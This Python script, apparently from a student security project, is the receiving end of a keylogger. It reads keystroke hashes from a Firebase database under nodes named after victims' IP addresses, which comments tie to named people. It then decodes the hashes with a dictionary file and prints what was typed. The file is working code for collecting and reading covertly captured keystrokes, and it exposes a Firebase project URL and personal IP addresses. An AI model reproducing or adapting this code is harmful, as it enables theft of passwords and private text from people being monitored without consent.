import firebase_admin
import json
from firebase_admin import credentials, db

# Load the service account credentials
cred = credentials.Certificate('./proyecto2-seguridad-75c81-firebase-adminsdk-pnjbc-be6b46646d.json')

# Initialize Firebase Admin SDK
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://proyecto2-seguridad-75c81-default-rtdb.firebaseio.com/'
})

# Get a reference to the database
# ref = db.reference('/201_219_236_64') # IP Alonso
ref = db.reference('/179_60_65_152')

# IP Basti: 179_60_65_152

# Read data from the root node
def read_data():
    data = ref.get()

    teclas = [v['tecla'] for k, v in data.items() if 'tecla' in v]

    return teclas


def cargar_diccionario_hashes(nombre_archivo):
    diccionario = {}
    with open(nombre_archivo, 'r', encoding='utf-8') as archivo:
        for linea in archivo:
            if ':' in linea:
                tecla, hash_tecla = linea.strip().split(': ')
                diccionario[hash_tecla] = tecla
    return diccionario


# Función para descifrar hashes capturados
def descifrar_hashes(nombre_archivo_hashes, diccionario):
    texto_descifrado = ""
    with open(nombre_archivo_hashes, 'r', encoding='utf-8') as archivo:
        for linea in archivo:
            hash_capturado = linea.strip()
            tecla = diccionario.get(hash_capturado, '?')  # '?' si el hash no se encuentra en el diccionario
            texto_descifrado += tecla
    return texto_descifrado


# Descifrar los hashes desde una lista
def descifrar_hashes_lista(lista_hashes, diccionario):
    texto_descifrado = ""
    for hash_capturado in lista_hashes:
        tecla = diccionario.get(hash_capturado, '?')
        texto_descifrado += tecla
    return texto_descifrado


diccionario_hashes = cargar_diccionario_hashes('diccionario_hashes.txt')

texto_descifrado = descifrar_hashes_lista(read_data(), diccionario_hashes)

print("Texto descifrado:", texto_descifrado)
